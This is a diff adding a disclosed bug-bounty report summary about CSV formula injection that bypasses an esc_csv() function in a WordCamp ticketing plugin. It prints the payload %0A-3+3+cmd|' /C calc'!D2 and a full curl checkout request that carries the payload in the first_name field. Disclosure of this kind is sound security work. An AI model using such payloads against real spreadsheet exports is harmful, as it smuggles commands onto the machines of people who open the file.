@@ -1,0 +1,21 @@
+ReportLink:https://hackerone.com/reports/160500
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/huops
+ReportedTo:Ian Dunn(iandunn-projects)
+BountyAmount:50.0
+Severity:low
+State:Closed
+DateOfDisclosure:13.10.2016 14:27:17
+
+Summary:
+white_walker reported that `esc_csv()` could be bypassed by using `%0A-3+3+cmd|' /C calc'!D2` as the payload.
+
+For example, the `first_name` parameter in the following request:
+
+```
+curl -ik 'https://2016.misc.wordcamp.dev/tickets/?tix_action=checkout#tix' -H 'Host: 2016.misc.wordcamp.dev' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: https://2016.misc.wordcamp.dev/tickets/?tix_action=attendee_info' -H 'Cookie: [redacted]' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data 'tix_tickets_selected%5B2415%5D=1&tix_attendee_info%5B1%5D%5Bticket_id%5D=2415&tix_attendee_info%5B1%5D%5Bfirst_name%5D=%0A-3%2B3%2Bcmd%7C%27+%2FC+calc%27%21D2&tix_attendee_info%5B1%5D%5Blast_name%5D=%0A,another&tix_attendee_info%5B1%5D%5Bemail%5D=ian.dunn%40foo.com&tix_receipt_email=1&tix_attendee_questions%5B1%5D%5B2472%5D=small&tix_attendee_questions%5B1%5D%5B2547%5D=&tix_attendee_questions%5B1%5D%5B2586%5D=&tix_attendee_questions%5B1%5D%5B43011%5D=Abkhazia&tix_attendee_questions%5B1%5D%5B43013%5D=Abkhazia'
+```
+
+That didn't work in practice, because the sanitization in `form_checkout()` strips newline characters, but it did reveal a bug in `esc_csv()` that could be exploited if it were ever called by a function that didn't strip newlines first.
+
+Newlines being interpreted as cell delimiters may only happen with certain OS locales configured, or in certain versions of Excel.
